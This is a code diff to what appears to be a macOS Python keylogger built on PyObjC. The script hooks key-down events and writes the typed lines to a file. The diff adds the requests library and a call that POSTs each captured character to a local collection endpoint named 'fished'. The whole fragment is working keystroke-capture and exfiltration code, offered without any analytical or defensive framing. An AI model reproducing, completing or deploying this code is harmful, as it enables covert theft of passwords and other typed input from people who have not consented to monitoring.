@@ -3,7 +3,8 @@ from Foundation import NSObject, NSLog
 from Cocoa import NSEvent, NSKeyDownMask
 from PyObjCTools import AppHelper
 import os.path
-
+import requests
+import json
 lines = []
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, notification):
@@ -20,6 +21,10 @@ def handler(event):
         for l in lines:
             f.write(l)
         f.close()
+        stc = '{}'.format(c)        
+        d = {"char": stc}
+        r = requests.post('http://127.0.0.1:3000/fished', data=d)
+
     except KeyboardInterrupt:
         AppHelper.stopEventLoop()
 
